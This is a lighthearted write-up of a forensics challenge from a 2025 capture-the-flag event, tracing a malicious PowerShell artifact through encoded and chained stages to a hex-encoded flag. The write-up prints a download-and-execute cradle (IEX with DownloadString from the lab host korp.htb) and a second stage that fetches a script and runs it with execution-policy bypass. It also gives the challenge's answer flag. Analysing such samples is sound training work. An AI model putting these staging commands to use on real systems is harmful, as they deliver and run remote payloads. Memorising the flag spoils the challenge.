# Cyber Apocalypse CTF 2025: Tales from Eldoria

## Thorin’s Amulet
> Garrick and Thorin’s visit to Stonehelm took an unexpected turn when Thorin’s old rival, Bron Ironfist, challenged him to a forging contest. In the end Thorin won the contest with a beautifully engineered clockwork amulet but the victory was marred by an intrusion. Saboteurs stole the amulet and left behind some tracks. Because of that it was possible to retrieve the malicious artifact that was used to start the attack. Can you analyze it and reconstruct what happened? Note: make sure that domain korp.htb resolves to your docker instance IP and also consider the assigned port to interact with the service

- **Category**: Forensics 
- **Difficulty**: Very Easy
- **Author**: Alexct549

## Writeup

WHY ARE THIS FORENSICS THIS LONG 😭😭😭

```ps1
function qt4PO {
    if ($env:COMPUTERNAME -ne "WORKSTATION-DM-0043") {
        exit
    }
    powershell.exe -NoProfile -NonInteractive -EncodedCommand "SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCJodHRwOi8va29ycC5odGIvdXBkYXRlIik="
}
qt4PO
```

Base 64 my beloved 😘

```
IEX (New-Object Net.WebClient).DownloadString("http://korp.htb/update")
```

Ok impress me

```bash
curl -s http://94.237.63.32:37077/update
```

NOO NOT ANOTHER PS1 COME ON 😰

```bash
wget http://94.237.63.32:37077/update -O update.ps1
```

```ps1
function aqFVaq {
    Invoke-WebRequest -Uri "http://korp.htb/a541a" -Headers @{"X-ST4G3R-KEY"="5337d322906ff18afedc1edc191d325d"} -Method GET -OutFile a541a.ps1
    powershell.exe -exec Bypass -File "a541a.ps1"
}
aqFVaq
```

Oh guess what...yeah ANOTHER PS1 🤯

```bash
curl -s 94.237.63.32:37077 -H "X-ST4G3R-KEY: 5337d322906ff18afedc1edc191d325d" -o a541a.ps1
```

```ps1
$a35 = "4854427b37683052314e5f4834355f346c573459355f3833336e5f344e5f39723334375f314e56336e3730727d"
($a35-split"(..)"|?{$_}|%{[char][convert]::ToInt16($_,16)}) -join ""
```

Disgusting 🤢 let me convert it to python real quick

```python
hex_string = "4854427b37683052314e5f4834355f346c573459355f3833336e5f344e5f39723334375f314e56336e3730727d"
decoded_string = bytes.fromhex(hex_string).decode()
print(decoded_string)
```

Never again 😤

> HTB{7h0R1N_H45_4lW4Y5_833n_4N_9r347_1NV3n70r}
